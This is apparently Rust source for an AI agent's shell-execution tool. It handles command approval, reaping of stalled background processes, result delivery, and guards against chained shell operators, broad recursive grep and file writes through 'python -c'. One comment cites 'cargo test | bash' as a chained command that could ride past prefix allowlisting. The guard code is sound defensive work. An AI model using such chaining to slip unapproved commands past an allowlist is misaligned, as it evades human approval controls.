use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, OnceLock, Weak};
use std::time::{Duration, Instant};

use async_trait::async_trait;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::Deserialize;
use serde_json::{json, Value};
use sqlx::SqlitePool;
use tokio::io::AsyncReadExt;
use tokio::sync::{mpsc, Mutex, RwLock};
use tokio::task::JoinHandle;
use tracing::{info, warn};

use crate::channels::ChannelHub;
use crate::config::SelfCorrectionConfig;
use crate::events::{
    ApprovalDeniedData, ApprovalGrantedData, ApprovalRequestedData, EventStore, EventType,
};
use crate::traits::{
    StateStore, Tool, ToolCallMetadata, ToolCallOutcome, ToolCallSemantics, ToolCapabilities,
    ToolExecutionContext, ToolVerificationMode,
};
use crate::types::{ApprovalResponse, MediaKind, MediaMessage, StatusUpdate};
use crate::utils::{truncate_str, truncate_with_note};

use super::command_patterns::{find_matching_pattern, record_approval, record_denial};
use super::command_risk::{classify_command, hard_block_reason, PermissionMode, RiskLevel};
use super::command_semantics::classify_shell_command;
use super::daemon_guard::detect_daemonization_primitives;
use super::process_control::{configure_command_for_process_group, send_sigkill, send_sigterm};

/// Max bytes per stream buffer (1 MB) to prevent unbounded memory growth.
const BUFFER_CAP: usize = 1_048_576;
#[cfg(test)]
const BACKGROUND_PROGRESS_INTERVAL_SECS: u64 = 1;
#[cfg(not(test))]
const BACKGROUND_PROGRESS_INTERVAL_SECS: u64 = 35;
/// Maximum number of periodic progress pings before going silent.
/// Prevents notification spam for long-running processes (servers, daemons).
const MAX_BACKGROUND_PROGRESS_PINGS: u32 = 3;

/// A disowned background process (notifier-active, non-detached) that makes no
/// progress (no CPU time, disk I/O, or output growth) for this long is treated
/// as stalled and auto-stopped by the heartbeat reaper. Default fallback for the
/// stall threshold when config is absent. The observed failure: a whole-disk
/// `du -ah ~ | sort | head` that emitted zero bytes and ran for ~11 hours
/// without exiting. Detached processes (dev servers started with `detach=true`)
/// are exempt, and any process that is genuinely working — advancing CPU time,
/// statting files (disk I/O), or streaming output — resets its progress clock
/// and is never reaped on the stall path.
pub const BACKGROUND_IDLE_REAP_SECS: u64 = 300;

/// Default maximum total runtime (seconds) for a notifier-active background
/// process, regardless of progress. Backstop for busy-loops (high CPU, no useful
/// progress) and genuinely-too-slow commands that would otherwise run forever.
/// 20 minutes. Used as the fallback when config is absent.
pub const BACKGROUND_MAX_RUNTIME_SECS: u64 = 1200;

/// Why a background process was reaped — drives the user-facing wording and the
/// `terminate_running_process` reason string.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReapReason {
    /// No CPU/disk/output progress for the stall threshold.
    Stalled,
    /// Total runtime hit the max-runtime backstop (busy-loop / too-slow).
    MaxRuntime,
}

impl ReapReason {
    fn as_str(self) -> &'static str {
        match self {
            ReapReason::Stalled => "stalled",
            ReapReason::MaxRuntime => "max_runtime",
        }
    }
    fn terminate_reason(self) -> &'static str {
        match self {
            ReapReason::Stalled => "idle: no progress",
            ReapReason::MaxRuntime => "idle: max runtime",
        }
    }
}

/// Cross-platform progress signal for one sweep. A process is "making progress"
/// if ANY of its cumulative CPU time, cumulative disk I/O bytes, or output bytes
/// grew since the last sweep. Pure + injectable so the policy is unit-testable
/// without spawning real processes or sampling the OS.
///
/// `*_now` values that could not be sampled (process gone / OS denied the stat)
/// MUST be passed as the previous value (no change) by the caller, so a missing
/// signal simply contributes nothing rather than being mistaken for progress.
fn process_made_progress(
    cpu_ms_prev: u64,
    cpu_ms_now: u64,
    io_bytes_prev: u64,
    io_bytes_now: u64,
    output_len_prev: usize,
    output_len_now: usize,
) -> bool {
    cpu_ms_now > cpu_ms_prev || io_bytes_now > io_bytes_prev || output_len_now > output_len_prev
}

/// Pure decision: should a tracked background process be idle-reaped?
///
/// Reaped only when it is notifier-active (the user was promised a result) and
/// not detached (detached = "survives, requires explicit kill"), AND either:
///   - it has made no progress (no CPU/IO/output advance) for at least
///     `stall_threshold` — truly stalled; or
///   - its total runtime has reached `max_runtime` — busy-loop / too-slow
///     backstop, fired even if it is technically "making progress".
///
/// Kept as a free function so the policy is unit-testable without spawning real
/// processes.
fn should_idle_reap(
    notifier_active: bool,
    detached: bool,
    no_progress_elapsed: Duration,
    total_runtime: Duration,
    stall_threshold: Duration,
    max_runtime: Duration,
) -> bool {
    if !notifier_active || detached {
        return false;
    }
    no_progress_elapsed >= stall_threshold || total_runtime >= max_runtime
}

/// Pure subtree resource aggregation: for each tracked root pid, sum the
/// cumulative `(cpu_ms, io_bytes)` of that pid AND all its transitive
/// descendants.
///
/// Background commands run via `sh -c '<pipeline>'`, so the tracked pid is the
/// idle `sh` wrapper while the real work (`du`/`find`/`sort`/`head`) runs in
/// child processes. Summing the whole subtree means a busy child registers as
/// progress for the tracked wrapper pid, preventing a false reap of a working
/// command.
///
/// Kept free of `sysinfo` so it can be unit-tested against synthetic trees:
/// `sample_process_resources` builds `children_of` + `per_pid` from sysinfo,
/// then delegates here.
///
/// - `children_of`: parent pid → child pids (built from each process's parent).
/// - `per_pid`: pid → `(cpu_ms, io_bytes)` cumulative sample for that one pid.
/// - A `visited` set guards against malformed cyclic maps (a real process tree
///   never cycles, but this is cheap insurance against an infinite loop).
/// - A root absent from `per_pid` (e.g. exited between snapshot and lookup)
///   yields no map entry; the caller carries forward the previous sample, so an
///   absent entry is safe.
fn sum_subtree_resources(
    roots: &[u32],
    children_of: &HashMap<u32, Vec<u32>>,
    per_pid: &HashMap<u32, (u64, u64)>,
) -> HashMap<u32, (u64, u64)> {
    // Defensive cap on traversal breadth for a single root so a pathologically
    // huge / malformed tree can't blow up the 60s sweep. A real background
    // pipeline has a handful of stages, never thousands.
    const MAX_SUBTREE_NODES: usize = 100_000;

    let mut out = HashMap::with_capacity(roots.len());
    for &root in roots {
        // Only emit an entry if the root itself was sampled; a missing root
        // means the process is gone and the caller must carry forward.
        if !per_pid.contains_key(&root) {
            continue;
        }
        let mut visited: HashSet<u32> = HashSet::new();
        let mut stack: Vec<u32> = vec![root];
        let mut cpu_sum: u64 = 0;
        let mut io_sum: u64 = 0;
        while let Some(pid) = stack.pop() {
            if !visited.insert(pid) {
                continue; // cycle guard / already counted
            }
            if visited.len() > MAX_SUBTREE_NODES {
                break;
            }
            if let Some(&(cpu, io)) = per_pid.get(&pid) {
                cpu_sum = cpu_sum.saturating_add(cpu);
                io_sum = io_sum.saturating_add(io);
            }
            if let Some(children) = children_of.get(&pid) {
                for &child in children {
                    if !visited.contains(&child) {
                        stack.push(child);
                    }
                }
            }
        }
        out.insert(root, (cpu_sum, io_sum));
    }
    out
}

/// A request sent to the ChannelHub for command approval.
pub struct ApprovalRequest {
    pub command: String,
    pub session_id: String,
    pub risk_level: RiskLevel,
    pub warnings: Vec<String>,
    pub permission_mode: PermissionMode,
    pub response_tx: tokio::sync::oneshot::Sender<ApprovalResponse>,
    /// What kind of approval this is (command vs goal confirmation).
    pub kind: crate::types::ApprovalKind,
}

/// A background process being tracked after it exceeded the initial timeout.
///
/// Process lifecycle modes:
/// 1. **Task-owned** (`detached=false`, `notifier_active=false`): killed on task-end.
/// 2. **Background with notifier** (`detached=false`, `notifier_active=true`): survives
///    task-end so the notifier can deliver the result. Killed when the notifier finishes.
/// 3. **Detached** (`detached=true`): survives task-end and notifier. Requires explicit kill.
struct RunningProcess {
    command: String,
    dedupe_key: Option<String>,
    owner_task_id: Option<String>,
    detached: bool,
    started_at: Instant,
    stdout_buf: Arc<Mutex<Vec<u8>>>,
    stderr_buf: Arc<Mutex<Vec<u8>>>,
    reader_handle: JoinHandle<Option<i32>>,
    child_id: u32,
    notify_on_completion: Arc<AtomicBool>,
    /// True only when the background notifier tokio task was actually spawned
    /// and is actively monitoring this process for completion/progress delivery.
    /// Used by `cleanup_task_processes` to decide whether to kill or disown.
    notifier_active: bool,
    /// Session/goal that launched this command, captured so the idle-reaper can
    /// notify the user when it auto-stops a hung background process. Empty for
    /// task-owned processes that never enter the notifier path.
    notify_session_id: String,
    notify_goal_id: String,
    /// Idle-reap bookkeeping: total output bytes observed at the last sweep and
    /// the instant ANY progress signal last advanced. A notifier-active,
    /// non-detached process that makes no progress (no CPU time, disk I/O, or
    /// output growth) for the stall threshold is treated as hung (e.g. a
    /// whole-disk `du`/`find` scan) and stopped by the heartbeat reaper.
    /// Genuinely-working processes keep resetting `last_progress_at` and survive
    /// the stall path; the max-runtime backstop still catches busy-loops.
    last_progress_len: usize,
    last_progress_at: Instant,
    /// Cumulative CPU time (ms) observed at the last sweep. Advancing CPU time is
    /// progress even when the process is silent (a busy scan statting files).
    last_cpu_ms: u64,
    /// Cumulative disk read+written bytes observed at the last sweep. Advancing
    /// disk I/O is progress even when the process is silent.
    last_io_bytes: u64,
}

/// Finalized background process output retained briefly so `action="check"`
/// can still return results after automatic reaping.
struct CompletedProcess {
    output: String,
    metadata: ToolCallMetadata,
    completed_at: Instant,
}

/// Max agent re-engagements from background-command completions per session
/// within [`REENGAGE_WINDOW`]. Beyond the cap the raw output is delivered
/// instead of re-entering the agent loop. Guards against runaway cycles where
/// a re-engaged task stalls, spawns another background command, and its
/// completion re-engages again (observed 2026-06-06: a stalled task re-spawned
/// whole-home `find` scans, burning ~24k-token LLM calls for ~30 minutes).
const MAX_REENGAGEMENTS_PER_WINDOW: usize = 3;
/// Sliding window for the re-engagement cap.
const REENGAGE_WINDOW: Duration = Duration::from_secs(600);
const BACKGROUND_DELIVERY_DEDUPE_WINDOW: Duration = Duration::from_secs(600);

/// Sliding-window limiter for background-completion agent re-engagements.
/// Records `now` and returns `true` when the session still has budget;
/// returns `false` (recording nothing) once the cap is reached.
fn reengagement_allowed(
    log: &mut HashMap<String, std::collections::VecDeque<Instant>>,
    session_id: &str,
    now: Instant,
) -> bool {
    let entries = log.entry(session_id.to_string()).or_default();
    while entries
        .front()
        .is_some_and(|t| now.duration_since(*t) >= REENGAGE_WINDOW)
    {
        entries.pop_front();
    }
    if entries.len() >= MAX_REENGAGEMENTS_PER_WINDOW {
        return false;
    }
    entries.push_back(now);
    true
}

fn normalize_background_delivery_text(text: &str) -> String {
    text.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn background_delivery_allowed(
    log: &mut HashMap<String, HashMap<String, Instant>>,
    session_id: &str,
    text: &str,
    now: Instant,
) -> bool {
    let normalized = normalize_background_delivery_text(text);
    if normalized.is_empty() {
        return false;
    }

    let entries = log.entry(session_id.to_string()).or_default();
    entries.retain(|_, sent_at| now.duration_since(*sent_at) < BACKGROUND_DELIVERY_DEDUPE_WINDOW);
    if entries.contains_key(&normalized) {
        return false;
    }

    entries.insert(normalized, now);
    true
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DeliverableDeliveryState {
    Delivering,
    Delivered,
    Failed,
}

#[derive(Debug)]
enum DeliverableAttribution {
    One(PathBuf),
    Ambiguous(Vec<PathBuf>),
    ExpectedMissing(Vec<PathBuf>),
    Hints(Vec<String>),
    None,
}

fn format_deliverable_paths(paths: &[PathBuf]) -> String {
    paths
        .iter()
        .take(5)
        .map(|p| format!("`{}`", p.display()))
        .collect::<Vec<_>>()
        .join(", ")
}

/// Completion-time deliverable attribution for a finished background command.
///
/// Reads the session's incomplete checklist (best-effort) and runs the pure
/// [`attribute_deliverable`](crate::tools::background_deliverable::attribute_deliverable)
/// classifier over the command + any referenced script + filesystem mtimes.
async fn attribute_background_deliverable(
    session_id: &str,
    command: &str,
    command_start: std::time::SystemTime,
    command_end: std::time::SystemTime,
    plan_store: Option<&Arc<crate::plans::PlanStore>>,
) -> DeliverableAttribution {
    let checklist_text: Vec<String> = match plan_store {
        Some(ps) => match ps.get_incomplete_for_session(session_id).await {
            Ok(Some(plan)) => plan.steps.iter().map(|s| s.description.clone()).collect(),
            _ => Vec::new(),
        },
        None => Vec::new(),
    };
    let read_script = |p: &std::path::Path| -> Option<String> { std::fs::read_to_string(p).ok() };
    let stat_mtime = |p: &std::path::Path| -> Option<std::time::SystemTime> {
        std::fs::metadata(p).ok().and_then(|m| m.modified().ok())
    };
    let ctx = crate::tools::background_deliverable::attribute_deliverable(
        session_id,
        command,
        command_start,
        command_end,
        &checklist_text,
        &read_script,
        &stat_mtime,
    );
    match crate::tools::background_deliverable::auto_send_decision(&ctx) {
        crate::tools::background_deliverable::AutoSendDecision::One(p) => {
            DeliverableAttribution::One(p)
        }
        crate::tools::background_deliverable::AutoSendDecision::Ambiguous(paths) => {
            DeliverableAttribution::Ambiguous(paths)
        }
        crate::tools::background_deliverable::AutoSendDecision::None => {
            if !ctx.unconfirmed_candidates.is_empty() {
                DeliverableAttribution::ExpectedMissing(ctx.unconfirmed_candidates)
            } else if !ctx.pattern_hints.is_empty() {
                DeliverableAttribution::Hints(ctx.pattern_hints)
            } else {
                DeliverableAttribution::None
            }
        }
    }
}

/// Map a [`file_delivery::DeliveryError`] to a short, honest user-facing reason.
fn describe_delivery_error(err: &crate::tools::file_delivery::DeliveryError) -> String {
    use crate::tools::file_delivery::DeliveryError;
    match err {
        DeliveryError::FileNotFound(_) => "the file no longer exists".to_string(),
        DeliveryError::NotRegularFile(_) => "it is not a regular file".to_string(),
        DeliveryError::Blocked(_) => "the path is blocked for security reasons".to_string(),
        DeliveryError::OutsideAllowedDirs(_) => {
            "it is outside the allowed delivery directories".to_string()
        }
        DeliveryError::RecoveryFailed { error, .. } => {
            format!("recovery into the inbox failed ({error})")
        }
        DeliveryError::Ambiguous(_) => "multiple files matched the name".to_string(),
    }
}

/// Build the user-facing caption for an auto-delivered background result file.
/// Never embeds the shell command — only the filename and an optional summary.
fn build_deliverable_caption(filename: &str, summary: Option<&str>) -> String {
    match summary {
        Some(s) if !s.trim().is_empty() => format!("{}\n\n📄 {}", s.trim(), filename),
        _ => format!("Done — result file attached.\n\n📄 {}", filename),
    }
}

/// Deliver one attributed produced-output file directly to the session's
/// channel, guarded by the process-scoped deliver-once ledger. On a successful
/// document send, the conservative single-item checklist write-back marks the
/// delivery step complete. On any failure, an honest text message is sent
/// instead so the user is never left thinking a file was delivered when it was
/// not. Returns nothing; all paths are best-effort with logging.
#[allow(clippy::too_many_arguments)]
async fn deliver_attributed_background_file(
    path: &std::path::Path,
    session_id: &str,
    _command_summary: &str,
    inbox_dir: &std::path::Path,
    outbox_dirs: &[PathBuf],
    delivered_deliverables: &Arc<Mutex<HashMap<(String, String), DeliverableDeliveryState>>>,
    plan_store: Option<&Arc<crate::plans::PlanStore>>,
    hub: Option<&Arc<ChannelHub>>,
    state: Option<&Arc<dyn crate::traits::StateStore>>,
    goal_id: &str,
    pid: u32,
) {
    let original_name = path
        .file_name()
        .map(|f| f.to_string_lossy().to_string())
        .unwrap_or_else(|| path.to_string_lossy().to_string());
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let ready = match crate::tools::file_delivery::prepare_delivery(
        &path.to_string_lossy(),
        &cwd,
        inbox_dir,
        outbox_dirs,
    ) {
        Ok(r) => r,
        Err(e) => {
            let msg = format!(
                "⚠️ The background command finished and produced `{}`, but I couldn't deliver it: {}.",
                original_name,
                describe_delivery_error(&e)
            );
            deliver_background_text(hub, state, session_id, goal_id, &msg, pid).await;
            return;
        }
    };

    let canonical = ready.canonical_path.to_string_lossy().to_string();
    // Deliver-once: the FIRST claimant for this (session, canonical path) sends;
    // duplicate completion paths / the reaper / a re-engaged send get `false`.
    {
        let mut ledger = delivered_deliverables.lock().await;
        let key = (session_id.to_string(), canonical.clone());
        match ledger.get(&key) {
            Some(DeliverableDeliveryState::Delivered | DeliverableDeliveryState::Delivering) => {
                info!(
                    pid,
                    session_id = %session_id,
                    "Deliver-once: background deliverable already sent or in flight; skipping re-send"
                );
                return;
            }
            Some(DeliverableDeliveryState::Failed) | None => {
                ledger.insert(key, DeliverableDeliveryState::Delivering);
            }
        }
    }

    let mark_delivery_state = |state: DeliverableDeliveryState| {
        let delivered_deliverables = delivered_deliverables.clone();
        let session_id = session_id.to_string();
        let canonical = canonical.clone();
        async move {
            delivered_deliverables
                .lock()
                .await
                .insert((session_id, canonical), state);
        }
    };

    let caption = build_deliverable_caption(&ready.filename, None);
    let msg = MediaMessage {
        session_id: session_id.to_string(),
        caption: caption.clone(),
        kind: MediaKind::Document {
            file_path: ready.canonical_path.to_string_lossy().to_string(),
            filename: ready.filename.clone(),
        },
        // No result_tx: `send_media_strict` already returns Err on a non-media
        // channel or send failure, so its `Ok` IS the honest success signal — a
        // text fallback can never masquerade as a document delivery.
        result_tx: None,
    };

    let sent = match hub {
        Some(hub) => match hub.send_media_strict(session_id, &msg).await {
            Ok(()) => true,
            Err(e) => {
                warn!(
                    pid,
                    error = %e,
                    session_id = %session_id,
                    "Failed to deliver attributed background result file"
                );
                false
            }
        },
        None => false,
    };

    if sent {
        mark_delivery_state(DeliverableDeliveryState::Delivered).await;
        info!(
            pid,
            session_id = %session_id,
            filename = %ready.filename,
            "Delivered attributed background result file as a document"
        );
        // Conservative single-item checklist write-back (ignores Ok(false)).
        if let Some(ps) = plan_store {
            if let Err(e) = ps.mark_delivery_step_complete(session_id).await {
                warn!(
                    pid,
                    error = %e,
                    session_id = %session_id,
                    "Failed to mark delivery checklist step complete after sending file"
                );
            }
        }
    } else {
        mark_delivery_state(DeliverableDeliveryState::Failed).await;
        let msg = format!(
            "⚠️ The background command finished and produced `{original_name}`, but I couldn't deliver the file to this channel."
        );
        deliver_background_text(hub, state, session_id, goal_id, &msg, pid).await;
    }
}

/// Send a background status/failure line to the session's channel, falling back
/// to the durable notification queue when no live channel is available. Mirrors
/// the hub-then-enqueue pattern used throughout the completion notifier.
/// Deliver the background completion ping, preferring to EDIT the session's
/// registered "⏳ Still on it — …" handoff message in place (single evolving
/// status bubble) over stacking a new message. Falls back to the plain
/// send/enqueue path on any miss or edit failure, so the ping is never lost.
/// The final ANSWER (re-engagement reply) intentionally stays a separate
/// fresh message — edits do not trigger channel notifications.
pub(crate) async fn deliver_background_completion_ping(
    hub: Option<&Arc<ChannelHub>>,
    state: Option<&Arc<dyn crate::traits::StateStore>>,
    session_id: &str,
    goal_id: &str,
    message: &str,
    pid: u32,
) {
    if let Some(hub) = hub {
        if let Some(surface_id) = hub.take_background_status_surface(session_id).await {
            match hub.edit_text(session_id, &surface_id, message).await {
                Ok(true) => {
                    info!(
                        pid,
                        session_id,
                        "Background completion ping edited into the handoff status message"
                    );
                    return;
                }
                other => {
                    info!(
                        pid,
                        session_id,
                        ?other,
                        "Handoff status edit unavailable; falling back to fresh ping message"
                    );
                }
            }
        }
    }
    deliver_background_text(hub, state, session_id, goal_id, message, pid).await;
}

async fn deliver_background_text(
    hub: Option<&Arc<ChannelHub>>,
    state: Option<&Arc<dyn crate::traits::StateStore>>,
    session_id: &str,
    goal_id: &str,
    message: &str,
    pid: u32,
) {
    let mut delivered = false;
    if let Some(hub) = hub {
        match hub.send_text(session_id, message).await {
            Ok(()) => delivered = true,
            Err(e) => warn!(
                pid,
                error = %e,
                session_id = %session_id,
                "Failed to deliver background deliverable status text"
            ),
        }
    }
    if !delivered {
        if let Some(state) = state {
            let entry =
                crate::traits::NotificationEntry::new(goal_id, session_id, "progress", message);
            if let Err(e) = state.enqueue_notification(&entry).await {
                warn!(
                    pid,
                    error = %e,
                    session_id = %session_id,
                    goal_id = %goal_id,
                    "Failed to enqueue background deliverable status text"
                );
            }
        }
    }
}

pub struct TerminalTool {
    /// Permanently allowed prefixes (from config + DB)
    allowed_prefixes: Arc<RwLock<Vec<String>>>,
    /// Session-only allowed prefixes (cleared on restart)
    session_approved: Arc<RwLock<HashSet<String>>>,
    /// Permission persistence mode
    permission_mode: PermissionMode,
    approval_tx: super::ApprovalBroker,
    running: Arc<Mutex<HashMap<u32, RunningProcess>>>,
    running_by_dedupe_key: Arc<Mutex<HashMap<String, u32>>>,
    task_processes: Arc<Mutex<HashMap<String, HashSet<u32>>>>,
    completed: Arc<Mutex<HashMap<u32, CompletedProcess>>>,
    initial_timeout: Duration,
    max_output_chars: usize,
    pool: Option<SqlitePool>,
    event_store: Option<Arc<EventStore>>,
    state: Option<Arc<dyn StateStore>>,
    hub: OnceLock<Weak<ChannelHub>>,
    /// Weak reference to the agent, used to re-engage the agent loop when
    /// a background terminal command completes so the agent can process the
    /// output and continue working on the original task.
    agent: OnceLock<Weak<crate::agent::Agent>>,
    /// Per-session timestamps of recent background-completion re-engagements,
    /// used by [`reengagement_allowed`] to cap runaway re-engagement loops.
    reengagements: Arc<Mutex<HashMap<String, std::collections::VecDeque<Instant>>>>,
    recent_background_deliveries: Arc<Mutex<HashMap<String, HashMap<String, Instant>>>>,
    /// Process-scoped deliver-once ledger keyed by `(session_id, canonical path)`.
    /// `Delivered` is recorded only after a real document/media send succeeds;
    /// failed sends remain retryable.
    delivered_deliverables: Arc<Mutex<HashMap<(String, String), DeliverableDeliveryState>>>,
    /// Durable plan store, used at background completion to read the session's
    /// incomplete checklist (for deliverable attribution + the conservative
    /// delivery-step write-back). Wired via [`set_plan_store`].
    plan_store: OnceLock<Arc<crate::plans::PlanStore>>,
    /// Inbox directory for harness-side file delivery recovery-copy. Defaults to
    /// the system temp dir until wired via [`with_delivery_dirs`].
    inbox_dir: PathBuf,
    /// Allowed outbox directories for harness-side file delivery validation.
    outbox_dirs: Vec<PathBuf>,
    /// Self-correction bridge config. Consulted by the idle-reaper: when a hung
    /// background command is stopped, this config decides whether an autonomous
    /// remediation task is dispatched (live), shadow-logged, or skipped
    /// (disabled / unsafe scope). Defaults to the safe-off
    /// [`SelfCorrectionConfig::default`] unless wired via
    /// [`TerminalTool::with_self_correction`].
    self_correction: SelfCorrectionConfig,
}

/// Check if a command string contains shell operators.
/// Used for prefix matching - we don't allow prefix matches for commands with operators
/// since "cargo" shouldn't match "cargo test | bash".
fn contains_shell_operator(cmd: &str) -> bool {
    // Must be quote-aware: operators inside single/double quotes are not shell operators
    let bytes = cmd.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;
    while i < len {
        let b = bytes[i];
        match b {
            b'\'' if !in_double => {
                in_single = !in_single;
                i += 1;
            }
            b'"' if !in_single => {
                in_double = !in_double;
                i += 1;
            }
            b'\\' if (in_double || in_single) && i + 1 < len => {
                i += 2; // skip escaped char
            }
            _ if in_single || in_double => {
                i += 1; // inside quotes, skip
            }
            b';' | b'|' | b'`' | b'\n' => return true,
            b'&' if i + 1 < len && bytes[i + 1] == b'&' => return true,
            b'$' if i + 1 < len && bytes[i + 1] == b'(' => return true,
            b'>' if i + 1 < len && bytes[i + 1] == b'(' => return true,
            b'<' if i + 1 < len && bytes[i + 1] == b'(' => return true,
            _ => {
                i += 1;
            }
        }
    }
    false
}

/// Split a chained command into individual segments by pipe, semicolon, &&, ||.
/// Used by session-approval to extract per-segment binary names.
/// Quote-aware: operators inside single/double quotes are not treated as separators.
fn split_command_segments(cmd: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let bytes = cmd.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single = false;
    let mut in_double = false;
    while i < len {
        let b = bytes[i];
        match b {
            b'\'' if !in_double => {
                in_single = !in_single;
                i += 1;
            }
            b'"' if !in_single => {
                in_double = !in_double;
                i += 1;
            }
            b'\\' if (in_double || in_single) && i + 1 < len => {
                i += 2; // skip escaped char
            }
            _ if in_single || in_double => {
                i += 1; // inside quotes, skip
            }
            b'|' if i + 1 < len && bytes[i + 1] == b'|' => {
                segments.push(&cmd[start..i]);
                i += 2;
                start = i;
            }
            b'|' => {
                segments.push(&cmd[start..i]);
                i += 1;
                start = i;
            }
            b'&' if i + 1 < len && bytes[i + 1] == b'&' => {
                segments.push(&cmd[start..i]);
                i += 2;
                start = i;
            }
            b';' => {
                segments.push(&cmd[start..i]);
                i += 1;
                start = i;
            }
            _ => {
                i += 1;
            }
        }
    }
    if start < len {
        segments.push(&cmd[start..]);
    }
    segments
        .into_iter()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Extract the binary/command name from a single command segment.
/// Handles variable assignments like `VAR=val cmd args...` by skipping
/// assignment tokens and returning the first non-assignment word.
fn extract_segment_binary(segment: &str) -> &str {
    for word in segment.split_whitespace() {
        // Skip shell variable assignments (e.g., EPOCH=$(date ...))
        if word.contains('=') {
            continue;
        }
        return word;
    }
    ""
}

fn is_grep_command(token: &str) -> bool {
    std::path::Path::new(token)
        .file_name()
        .and_then(|name| name.to_str())
        .is_some_and(|name| name == "grep")
}

fn grep_has_recursive_flag(token: &str) -> bool {
    if matches!(token, "--recursive" | "--dereference-recursive") {
        return true;
    }
    if token.starts_with("--") {
        return false;
    }
    token
        .strip_prefix('-')
        .is_some_and(|flags| flags.chars().any(|c| c == 'r' || c == 'R'))
}

fn has_recursive_grep_scope_controls(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    lower.contains("--exclude-dir")
        || lower.contains("--exclude=")
        || lower.contains("--exclude ")
        || lower.contains("--include")
        || lower.contains("-d skip")
        || lower.contains("-dskip")
}

/// Detect `python3 -c "..."` commands that perform file **write** I/O.
/// Read-only operations (ast.parse, open().read(), json.load) are allowed
/// since there's no dedicated tool equivalent for validation/syntax checks.
/// Only file writes should use write_file/edit_file tools instead.
fn is_python_c_with_file_write_io(command: &str) -> bool {
    // Split by shell operators to check each segment
    let lower = command.to_ascii_lowercase();

    // Quick pre-check: must contain python and -c
    if !lower.contains("python") || !lower.contains("-c") {
        return false;
    }

    // Parse the command properly to extract the -c argument
    let parts = match shell_words::split(command) {
        Ok(p) => p,
        Err(_) => return false,
    };

    // Find python/python3 followed by -c
    let mut i = 0;
    while i < parts.len() {
        let base = std::path::Path::new(&parts[i])
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(&parts[i]);

        if matches!(base, "python" | "python3") {
            // Look for -c flag in subsequent args
            for j in (i + 1)..parts.len() {
                if parts[j] == "-c" {
                    // The code string is the next argument (or concatenated)
                    let code = if j + 1 < parts.len() {
                        parts[j + 1].to_ascii_lowercase()
                    } else {
                        String::new()
                    };

                    // Only block file WRITE operations — read-only is fine.
                    let file_write_patterns = [
                        ".write(",
                        ".writelines(",
                        "write_text(",
                        // json.dump( writes to file; json.dumps( returns string (safe)
                        "json.dump(",
                    ];
                    if file_write_patterns.iter().any(|p| code.contains(p)) {
                        return true;
                    }

                    // Check for open() with explicit write/append mode
                    if code.contains("open(") {
                        let write_modes = [
                            "'w'", "\"w\"", "'a'", "\"a\"", "'x'", "\"x\"", "'wb'", "\"wb\"",
                            "'ab'", "\"ab\"", "'xb'", "\"xb\"", "'w+'", "\"w+\"", "'a+'", "\"a+\"",
                            "'r+'", "\"r+\"",
                        ];
                        if write_modes.iter().any(|m| code.contains(m)) {
                            return true;
                        }
                    }

                    break;
                }
            }
        }
        i += 1;
    }

    false
}

fn detect_unscoped_recursive_grep_segment(segment: &str) -> Option<(String, String)> {
    let tokens = shell_words::split(segment).ok()?;
    let first = tokens.first()?;
    if !is_grep_command(first) {
        return None;
    }

    let recursive = tokens
        .iter()
        .skip(1)
        .any(|tok| grep_has_recursive_flag(tok));
    if !recursive || has_recursive_grep_scope_controls(segment) {
        return None;
    }

    // grep syntax: grep [OPTIONS] PATTERN [FILE...]
    // We use a lightweight parse here: non-option tokens are treated as
    // positional args; first positional = pattern, remaining = target paths.
    let positionals: Vec<String> = tokens
        .iter()
        .skip(1)
        .filter(|tok| !tok.starts_with('-'))
        .cloned()
        .collect();
    let pattern = positionals.first()?.clone();
    let paths = if positionals.len() >= 2 {
        positionals[1..].to_vec()
    } else {
        vec![".".to_string()]
    };
    let broad_scope = paths
        .iter()
        .any(|p| matches!(p.as_str(), "." | "./" | "/" | "~" | "~/"));
    if !broad_scope {
        return None;
    }

    Some((pattern, paths.join(" ")))
}

fn detect_unscoped_recursive_grep(command: &str) -> Option<(String, String)> {
    if let Some(hit) = detect_unscoped_recursive_grep_segment(command) {
        return Some(hit);
    }

    // Also scan chained shell segments (e.g. "cd repo && grep -rc ... .").
    // This is intentionally simple and best-effort: it catches common cases
    // without trying to fully parse shell grammar.
    static SHELL_CHAIN_SPLIT_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r"(?:&&|\|\||;|\|)").expect("valid chain regex"));
    for segment in SHELL_CHAIN_SPLIT_RE.split(command) {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        if let Some(hit) = detect_unscoped_recursive_grep_segment(trimmed) {
            return Some(hit);
        }
    }

    None
}

fn recursive_grep_block_message(pattern: &str, path: &str) -> String {
    let ignore_globs = super::fs_utils::DEFAULT_IGNORE_DIRS.join(",");
    format!(
        "Blocked: broad recursive `grep` without include/exclude filters is likely to stall on large trees.\n\
Detected pattern: \"{}\"\n\
Detected path: {}\n\n\
Use one of these instead:\n\
- `search_files` (preferred) with explicit `path`, optional `glob`, and regex `pattern`\n\
- Terminal `rg` with exclusions:\n\
  `rg -n --glob '!{{{}}}' \"<pattern>\" <path>`\n\
- If you must use grep, add `--exclude-dir` and/or `--include` so the scan is bounded.",
        pattern, path, ignore_globs
    )
}

/// True only for the filesystem root or the home directory itself — the scan
/// roots that make `du`/`find` pathologically slow. Subdirectories return false.
#[allow(dead_code)]
fn is_broad_scan_root(path: &str) -> bool {
    let p = path.trim();
    if p == "/" {
        return true;
    }
    let p = p.trim_end_matches('/');
    if p == "~" || p == "$HOME" {
        return true;
    }
    if let Ok(home) = std::env::var("HOME") {
        if !home.is_empty() && p == home.trim_end_matches('/') {
            return true;
        }
    }
    false
}

/// Expand a leading `~` / `$HOME` in a shell path operand to the absolute home
/// directory. Returns `None` if `HOME` is unset. UTF-8-safe (operates on
/// `char`/`str` boundaries, never raw byte indices).
